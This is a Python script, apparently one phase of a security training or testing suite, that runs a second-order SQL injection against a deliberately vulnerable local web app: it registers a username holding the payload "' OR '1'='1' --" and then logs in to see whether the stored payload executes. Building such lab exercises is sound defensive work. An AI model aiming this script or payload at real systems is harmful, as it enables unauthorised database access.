#!/usr/bin/env python3
"""Phase 7: Second-Order SQL Injection - Stored Payloads"""

import requests
import argparse
import random
import string


class Phase7SecondOrder:
    def __init__(self, target="http://localhost:5001"):
        self.target = target

    def register_user(self, username, email, password):
        try:
            data = {"username": username, "email": email, "password": password}
            response = requests.post(
                f"{self.target}/api/vulnerable/register", json=data, timeout=5)
            return response.status_code == 200 or response.status_code == 201
        except:
            return False

    def login_user(self, username, password):
        try:
            data = {"username": username, "password": password}
            response = requests.post(
                f"{self.target}/api/vulnerable/login", json=data, timeout=5)
            return response.status_code == 200
        except:
            return False

    def run(self):
        print("\n" + "="*70)
        print("PHASE 7: SECOND-ORDER SQL INJECTION")
        print("="*70)
        print(f"Target: {self.target}\n")

        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=5))

        print("Step 1: Register with malicious username...")
        malicious_username = f"test' OR '1'='1' -- {random_suffix}"
        email = f"test_{random_suffix}@example.com"

        if self.register_user(malicious_username, email, "password123"):
            print(f"  ✅ Registered with username: {malicious_username}")
        else:
            print("  ❌ Registration failed")

        print("\nStep 2: Login normally...")
        if self.login_user(malicious_username, "password123"):
            print("  ✅ Login successful - The stored payload might have executed!")
        else:
            print("  ❌ Login failed")

        print("\n" + "="*70)
        print("✅ Phase 7 Complete")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase7SecondOrder(target=args.target)
    phase.run()
